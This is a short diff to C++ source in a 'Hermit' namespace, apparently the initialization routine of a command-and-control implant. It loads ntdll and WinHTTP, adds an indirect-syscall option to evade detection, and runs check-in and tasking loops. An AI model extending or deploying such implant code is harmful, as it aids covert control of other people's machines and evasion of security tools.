@@ -22,8 +22,7 @@ namespace Hermit
 		LPCWSTR 		lpKey,
 		LPCWSTR 		lpIV
 	) {
-
-		HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
+		 HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
         if (!hNTDLL)
         {
 			return;
@@ -42,8 +41,7 @@ namespace Hermit
 		pState->pTeb 				= NtCurrentTeb();
 		pState->hNTDLL				= hNTDLL;
 		pState->hWinHTTPDLL			= hWinHTTPDLL;
-		pState->pProcs 				= Procs::FindProcs(hNTDLL, hWinHTTPDLL);
-		pState->pSyscalls			= Syscalls::FindSyscalls(hNTDLL);
+		pState->pProcs 				= Procs::FindProcs(hNTDLL, hWinHTTPDLL, bIndirectSyscalls);
 		pState->hInstance 			= hInstance;
 		pState->nCmdShow 			= nCmdShow;
 		pState->lpPayloadType 		= lpPayloadType;
@@ -63,7 +61,7 @@ namespace Hermit
 		pState->hSession 			= NULL;
 		pState->hConnect 			= NULL;
 		pState->hRequest 			= NULL;
-		pState->pSocket 			= NULL;
+		// pState->pSocket 			= NULL;
 		pState->bQuit 				= FALSE;
 
 		// Get system information
@@ -89,6 +87,8 @@ namespace Hermit
 			if (Handler::CheckIn(pState, wInfoJson))
 				break;
 		} while (1 == 1);
+
+
 
 		// Tasks
 		do
